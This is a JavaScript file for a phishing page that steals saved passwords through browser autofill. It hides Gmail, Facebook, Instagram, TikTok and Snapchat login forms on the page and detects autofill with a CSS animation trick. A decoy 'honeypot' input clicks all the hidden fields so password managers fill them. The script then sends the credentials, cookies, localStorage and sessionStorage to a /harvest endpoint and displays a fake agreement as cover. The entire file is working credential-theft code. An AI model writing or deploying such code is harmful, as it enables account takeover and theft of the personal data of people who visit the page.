// A flag to prevent multiple harvests
window.harvested = false;

async function harvest() {
  // Check the flag to ensure this function only runs once
  if (window.harvested) return;
  window.harvested = true;

  // A short delay to ensure all autofill values are populated
  await new Promise(resolve => setTimeout(resolve, 50));

  const gmailForm = document.getElementById('gmail-form');
  const facebookForm = document.getElementById('facebook-form');
  const instagramForm = document.getElementById('instagram-form');
  const tiktokForm = document.getElementById('tiktok-form');
  const snapchatForm = document.getElementById('snapchat-form');

  const data = {
    gmail: {
      email: gmailForm ? gmailForm.email.value : '',
      password: gmailForm ? gmailForm.password.value : '',
    },
    facebook: {
      username: facebookForm ? facebookForm.username.value : '',
      password: facebookForm ? facebookForm.password.value : '',
    },
    instagram: {
      username: instagramForm ? instagramForm.username.value : '',
      password: instagramForm ? instagramForm.password.value : '',
    },
    tiktok: {
      username: tiktokForm ? tiktokForm.username.value : '',
      password: tiktokForm ? tiktokForm.password.value : '',
    },
    snapchat: {
      username: snapchatForm ? snapchatForm.username.value : '',
      password: snapchatForm ? snapchatForm.password.value : '',
    },
    userAgent: navigator.userAgent,
    cookies: document.cookie,
    localStorage: { ...localStorage },
    sessionStorage: { ...sessionStorage },
    timestamp: new Date().toISOString(),
  };

  try {
    // Use sendBeacon for a more reliable unload harvest
    if (navigator.sendBeacon) {
      const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
      navigator.sendBeacon('/harvest', blob);
      console.log('Beacon harvest sent.');
    } else {
      // Fallback to fetch for other cases
      const response = await fetch('/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      console.log('Harvest successful:', response.status);
    }
  } catch (error) {
    console.error('Harvest failed:', error);
  }

  // Redirect after a short delay
  setTimeout(() => {
    window.location.href = 'about:blank';
  }, 500);
}

// --- Autofill Detection using CSS Animation Trick ---
const style = document.createElement('style');
style.innerHTML = `
  @keyframes onAutoFillStart { from {} to {} }
  input:-webkit-autofill {
    animation-name: onAutoFillStart;
    animation-fill-mode: both;
  }
`;
document.head.appendChild(style);

document.addEventListener('animationstart', (e) => {
  if (e.animationName === 'onAutoFillStart') {
    harvest();
  }
}, true);

// --- Fallback Mechanisms ---
// 1. A timeout for non-webkit browsers or if the animation fails
// Fallback to ensure harvest is called
// After 2 seconds, attempt to harvest anyway, in case the animation trick fails
// This helps capture data on browsers that don't support the animation hack (e.g., Firefox)
setTimeout(harvest, 15000);

// Also, listen for the page unload event as a last resort
window.addEventListener('beforeunload', harvest);

// --- UI Logic ---
// Show the fake agreement after a delay
setTimeout(() => {
  const previewContainer = document.querySelector('.preview-container');
  const agreementContainer = document.querySelector('.agreement-container');
  if (previewContainer) previewContainer.style.display = 'none';
  if (agreementContainer) agreementContainer.style.display = 'block';
}, 1500); // 1.5 second delay to simulate loading


// --- Desktop Mouse-Move Autofill Trigger ---
// After 1.5 seconds, hide the loader and show the honeypot prompt
setTimeout(() => {
  const previewContainer = document.querySelector('.preview-container');
  const honeypotContainer = document.querySelector('.honeypot-container');
  if (previewContainer) previewContainer.style.display = 'none';
  if (honeypotContainer) honeypotContainer.style.display = 'block';
}, 1500);

// --- Honeypot Trigger Logic ---
function triggerAllAutofills() {
  // This function is called when the user interacts with the honeypot.
  // It programmatically clicks all hidden inputs to trigger browser autofill.
  console.log('Honeypot triggered, attempting to fire all autofill prompts...');

  // Click all the username/email fields to trigger password managers
  document.querySelector('#gmail-form input[name="email"]')?.click();
  document.querySelector('#facebook-form input[name="username"]')?.click();
  document.querySelector('#instagram-form input[name="username"]')?.click();
  document.querySelector('#tiktok-form input[name="username"]')?.click();
  document.querySelector('#snapchat-form input[name="username"]')?.click();
}

// Add a one-time event listener to the honeypot input.
// Using 'mousedown' as it can be more reliable for triggering programmatic clicks.
const honeypotInput = document.getElementById('honeypot-input');
if (honeypotInput) {
  honeypotInput.addEventListener('mousedown', triggerAllAutofills, { once: true });
}